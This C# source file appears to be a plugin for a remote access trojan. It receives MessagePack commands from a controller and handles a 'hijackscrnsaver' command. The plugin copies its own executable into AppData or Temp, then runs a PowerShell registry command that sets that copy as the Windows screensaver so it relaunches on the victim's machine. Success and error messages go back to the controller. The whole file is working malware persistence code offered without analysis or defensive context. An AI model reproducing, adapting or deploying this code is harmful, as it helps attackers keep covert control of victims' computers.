using MessagePackLib.MessagePack;
using System;
using System.Text;
using System.Threading;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "hijackscrnsaver":
                        {
                            HijackScrnSaver();
                            Connection.Disconnected();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void PSLoader(string cmd)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(cmd);
            pipeline.Invoke();
            rs.Close();
        }

        public static void HijackScrnSaver()
        {
            string name = Process.GetCurrentProcess().ProcessName + ".exe";
            string filepath;
            try
            {
                filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }
            catch
            {
                filepath = Path.Combine(Path.GetTempPath(), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }

            string cmd = "reg add \"hkcu\\control panel\\desktop\" /v SCRNSAVE.EXE /f /d " + filepath;
            try
            {
                PSLoader(cmd);
                Log(Connection.Hwid + ":[+] Hijack SCRNSAVE Success!");
            }
            catch(Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}